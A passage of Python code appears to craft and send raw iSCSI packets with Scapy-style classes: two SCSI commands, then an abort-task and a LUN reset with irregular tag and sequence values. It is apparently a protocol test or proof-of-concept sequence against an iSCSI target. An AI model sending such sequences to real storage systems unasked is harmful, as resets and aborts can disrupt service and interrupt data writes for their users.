...
wrq = ISCSI() / SCSICommand(flags="RF", itt=0x1, cmdsn=lirs.expcmdsn, edtl=edtl, cdb=cdb, lun=0x0001000000000000)
lirs.expcmdsn = lirs.expcmdsn + 2

s.send(wrq)
wrq = ISCSI() / SCSICommand(flags="RF", itt=0x2, cmdsn=lirs.expcmdsn, edtl=edtl, cdb=cdb, lun=0x0001000000000000)
s.send(wrq)

lirs.expcmdsn = lirs.expcmdsn + 2
abort = ISCSI(immediate=1) / TMFRequest(function="abort-task", itt=0x2, cmdsn=lirs.expcmdsn,
                                        rtt=0x5, refcmdsn=lirs.expcmdsn-5, lun=0x0001000000000000)
s.send(abort)

reset = ISCSI(immediate=1) / TMFRequest(function="lun-reset", itt=0x2, cmdsn=lirs.expcmdsn,
                                        rtt=0xFFFFFFFF, refcmdsn=lirs.expcmdsn, lun=0x0001000000000000)
s.send(reset)
